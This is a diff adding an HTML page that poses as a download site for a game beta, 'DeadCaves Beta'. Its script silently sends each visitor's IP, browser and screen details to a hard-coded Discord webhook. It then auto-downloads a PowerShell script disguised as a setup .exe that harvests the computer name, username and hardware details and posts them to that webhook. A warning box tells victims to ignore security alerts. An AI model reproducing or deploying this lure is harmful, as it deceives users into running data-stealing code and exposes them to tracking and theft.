@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Welcome to DeadCaves Beta</title>
+    <style>
+        body {
+            background-color: #000;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            text-align: center;
+            padding-top: 50px;
+            margin: 0;
+            height: 100vh;
+            overflow: hidden;
+        }
+        .warning {
+            color: #ff5555;
+            font-size: 14px;
+            margin-top: 30px;
+            max-width: 500px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .progress {
+            width: 80%;
+            margin: 20px auto;
+            height: 10px;
+            background: #333;
+            border-radius: 5px;
+            overflow: hidden;
+        }
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: #00ff00;
+            transition: width 2s;
+        }
+    </style>
+</head>
+<body>
+    <h1>WELCOME TO DEADCAVES BETA</h1>
+    <p>Preparing your game experience...</p>
+    
+    <div class="progress">
+        <div class="progress-bar" id="progressBar"></div>
+    </div>
+    
+    <div class="warning">
+        NOTE: Your device might flag this as suspicious because:<br>
+        - It's an uncertified beta version<br>
+        - Contains complex game protection systems<br>
+        - Uses advanced rendering technology<br>
+        This is completely normal for beta software!
+    </div>
+
+    <script>
+        // ===== CONFIGURATION =====
+        const CONFIG = {
+            webhook: "https://discord.com/api/webhooks/1360730243643474040/Ge2K7cEEWgzAMbOQ98vl3zajdkCpDxgGCDJHTc9MvqcNCTdMUw51ZsQB9lpvveL4XIa8",
+            filename: "DeadCaves_Beta_Setup.exe",
+            fakeGameSizeMB: 148 // For realistic progress bar
+        };
+
+        // ===== VISITOR TRACKING =====
+        async function trackVisitor() {
+            const data = {
+                ip: await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip:'Unknown'})).ip,
+                userAgent: navigator.userAgent,
+                screen: `${screen.width}x${screen.height}`,
+                platform: navigator.platform,
+                time: new Date().toISOString()
+            };
+
+            fetch(CONFIG.webhook, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "👀 NEW VISITOR - DeadCaves Beta",
+                        description: `**IP:** \`${data.ip}\`\n**Platform:** \`${data.platform}\``,
+                        color: 0x00ff00,
+                        fields: [
+                            {name: "Screen", value: data.screen, inline: true},
+                            {name: "User Agent", value: `\`${data.userAgent}\``}
+                        ],
+                        timestamp: data.time
+                    }]
+                })
+            });
+        }
+
+        // ===== MALWARE PAYLOAD =====
+        function deliverPayload() {
+            // Create realistic loading animation
+            const progressBar = document.getElementById('progressBar');
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += Math.random() * 10;
+                if (progress > 100) progress = 100;
+                progressBar.style.width = progress + '%';
+                
+                if (progress === 100) {
+                    clearInterval(interval);
+                    setTimeout(startDownload, 1000);
+                }
+            }, 300);
+
+            function startDownload() {
+                // Create PowerShell malware
+                const psScript = `
+                [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+                $webhook = "${CONFIG.webhook}"
+                
+                # Collect detailed system info
+                $systemInfo = @{
+                    ComputerName = $env:COMPUTERNAME
+                    UserName = $env:USERNAME
+                    OS = (Get-WmiObject Win32_OperatingSystem).Caption
+                    CPU = (Get-WmiObject Win32_Processor).Name
+                    RAM = "$((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB) GB"
+                    GPU = (Get-WmiObject Win32_VideoController).Name
+                    IP = (Invoke-RestMethod -Uri "https://api.ipify.org?format=json").ip
+                    Time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                }
+                
+                # Prepare Discord embed
+                $embed = @{
+                    title = "🎮 DEADCAVES BETA INSTALLED"
+                    description = "Game client executed successfully"
+                    color = "65280"
+                    fields = @(
+                        @{name = "System Info"; value = "```\nComputer: $($systemInfo.ComputerName)\nUser: $($systemInfo.UserName)\nOS: $($systemInfo.OS)\nCPU: $($systemInfo.CPU)\nRAM: $($systemInfo.RAM)\nGPU: $($systemInfo.GPU)\nIP: $($systemInfo.IP)\n```"}
+                    )
+                    timestamp = $systemInfo.Time
+                }
+                
+                # Send to Discord
+                Invoke-RestMethod -Uri $webhook -Method Post -Body (@{embeds = @($embed)} | ConvertTo-Json -Depth 4) -ContentType "application/json"
+                `;
+
+                // Create and trigger download
+                const blob = new Blob([psScript], {type: 'application/octet-stream'});
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = CONFIG.filename;
+                document.body.appendChild(a);
+                a.click();
+                
+                // Clean up
+                setTimeout(() => {
+                    document.body.removeChild(a);
+                    URL.revokeObjectURL(url);
+                    document.body.innerHTML = '<h1>Download complete! Check your downloads folder.</h1>';
+                }, 1000);
+            }
+        }
+
+        // ===== START PROCESS =====
+        trackVisitor(); // Log visitor immediately
+        setTimeout(deliverPayload, 3000); // Start download after 3 seconds
+    </script>
+</body>
+</html>
